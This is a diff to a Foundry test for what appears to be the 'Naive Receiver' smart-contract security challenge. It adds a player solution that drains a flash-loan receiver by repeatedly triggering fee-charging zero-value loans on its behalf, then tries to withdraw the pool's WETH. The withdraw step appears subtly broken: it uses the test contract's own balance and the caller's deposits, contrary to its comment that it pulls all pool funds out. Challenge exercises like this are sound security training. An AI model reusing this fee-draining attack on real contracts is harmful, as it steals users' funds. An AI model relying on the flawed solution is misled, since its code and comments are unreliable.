@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -42,7 +43,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
@@ -76,7 +81,23 @@ contract NaiveReceiverChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {}
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        vm.startPrank(player);
+
+        // Spam 10 flash loans of 0 WETH to drain the receiver's 10 WETH (1 ETH fee per loan)
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(weth), 0, "");
+        }
+
+        // Now the pool holds both WETH_IN_POOL + WETH_IN_RECEIVER
+        // We simply call `withdraw` from the pool to pull all WETH out
+        pool.withdraw(weth.balanceOf(address(this)), payable(player));
+
+        // Transfer all WETH to the recovery address
+        weth.transfer(recovery, weth.balanceOf(address(this)));
+
+        vm.stopPrank();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -86,12 +107,24 @@ contract NaiveReceiverChallenge is Test {
         assertLe(vm.getNonce(player), 2);
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
     }
 }
